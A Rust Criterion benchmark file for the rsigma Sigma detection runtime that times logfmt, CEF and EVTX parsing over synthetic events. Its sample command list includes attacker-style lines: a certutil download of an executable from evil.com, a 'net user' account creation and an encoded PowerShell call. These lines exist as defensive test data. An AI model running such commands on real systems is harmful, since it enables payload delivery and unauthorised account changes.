//! Feature-gated input format benchmarks: logfmt, CEF, and EVTX.
//!
//! Completes the format matrix the `runtime_throughput` bench covers for
//! JSON, syslog, and plain text. logfmt and CEF run through the same
//! `LogProcessor` pipeline (parse + detect, 100 rules); EVTX measures
//! `EvtxFileReader` binary-record parsing over the checked-in 2 MiB
//! `security.evtx` fixture, which is the dominant cost of `engine eval
//! -e @file.evtx`.
//!
//! Requires `--features logfmt,cef,evtx`.

use std::hint::black_box;
use std::sync::Arc;

use criterion::{BenchmarkId, Criterion, criterion_group, criterion_main};

use rsigma_eval::CorrelationConfig;
use rsigma_runtime::{EvtxFileReader, InputFormat, LogProcessor, NoopMetrics, RuntimeEngine};

const EVTX_FIXTURE: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/security.evtx");

const COMMANDS: &[&str] = &[
    "whoami /all",
    "cmd.exe /c net user admin P@ss123",
    "powershell.exe -enc SGVsbG8=",
    "certutil -urlcache -split -f http://evil.com/p.exe",
    "notepad.exe readme.txt",
    "systeminfo",
];

fn gen_rules(n: usize) -> String {
    let mut docs = Vec::with_capacity(n);
    for i in 0..n {
        docs.push(format!(
            "title: Format Bench Rule {i}\n\
             id: bench-fmt-{i:06}\n\
             logsource:\n\
             \x20   product: windows\n\
             \x20   category: process_creation\n\
             detection:\n\
             \x20   selection:\n\
             \x20       CommandLine|contains: 'needle_{i}_zzzz'\n\
             \x20   condition: selection\n\
             level: low\n"
        ));
    }
    docs.join("---\n")
}

fn make_processor(n_rules: usize) -> LogProcessor {
    let dir = tempfile::tempdir().unwrap();
    let rule_path = dir.path().join("bench.yml");
    std::fs::write(&rule_path, gen_rules(n_rules)).unwrap();
    let mut engine = RuntimeEngine::new(rule_path, vec![], CorrelationConfig::default(), false);
    engine.load_rules().unwrap();
    std::mem::forget(dir);
    LogProcessor::new(engine, Arc::new(NoopMetrics))
}

fn gen_logfmt_lines(n: usize) -> Vec<String> {
    (0..n)
        .map(|i| {
            let cmd = COMMANDS[i % COMMANDS.len()];
            format!(
                "ts=2026-07-05T12:00:{:02}Z level=info User=user_{} Image=/usr/bin/bash \
                 CommandLine=\"{cmd}\" SourceIp=10.0.{}.{} DestinationPort={}",
                i % 60,
                i % 100,
                i / 256 % 256,
                i % 256,
                1024 + i % 60000
            )
        })
        .collect()
}

fn gen_cef_lines(n: usize) -> Vec<String> {
    (0..n)
        .map(|i| {
            let cmd = COMMANDS[i % COMMANDS.len()];
            format!(
                "CEF:0|BenchVendor|BenchProduct|1.0|{}|Process started|5|\
                 src=10.0.{}.{} dst=192.168.1.{} spt={} duser=user_{} CommandLine={cmd}",
                100 + i % 10,
                i / 256 % 256,
                i % 256,
                i % 256,
                1024 + i % 60000,
                i % 100
            )
        })
        .collect()
}

fn bench_logfmt(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_logfmt");
    group.sample_size(20);
    let processor = make_processor(100);
    for n_events in [1_000usize, 10_000] {
        let lines = gen_logfmt_lines(n_events);
        group.throughput(criterion::Throughput::Elements(n_events as u64));
        group.bench_with_input(BenchmarkId::new("events", n_events), &lines, |b, lines| {
            b.iter(|| {
                black_box(processor.process_batch_with_format(
                    black_box(lines),
                    &InputFormat::Logfmt,
                    None,
                ))
            });
        });
    }
    group.finish();
}

fn bench_cef(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_cef");
    group.sample_size(20);
    let processor = make_processor(100);
    for n_events in [1_000usize, 10_000] {
        let lines = gen_cef_lines(n_events);
        group.throughput(criterion::Throughput::Elements(n_events as u64));
        group.bench_with_input(BenchmarkId::new("events", n_events), &lines, |b, lines| {
            b.iter(|| {
                black_box(processor.process_batch_with_format(
                    black_box(lines),
                    &InputFormat::Cef,
                    None,
                ))
            });
        });
    }
    group.finish();
}

fn bench_evtx(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_evtx");
    group.sample_size(20);

    // Count records once so the throughput unit is records, not files.
    let n_records = EvtxFileReader::open(EVTX_FIXTURE)
        .expect("failed to open fixture")
        .records()
        .filter(|r| r.is_ok())
        .count() as u64;
    group.throughput(criterion::Throughput::Elements(n_records));

    group.bench_function("parse_security_evtx", |b| {
        b.iter(|| {
            let mut reader = EvtxFileReader::open(black_box(EVTX_FIXTURE)).unwrap();
            let n = reader.records().filter(|r| r.is_ok()).count();
            black_box(n);
        });
    });

    group.finish();
}

criterion_group!(benches, bench_logfmt, bench_cef, bench_evtx);
criterion_main!(benches);
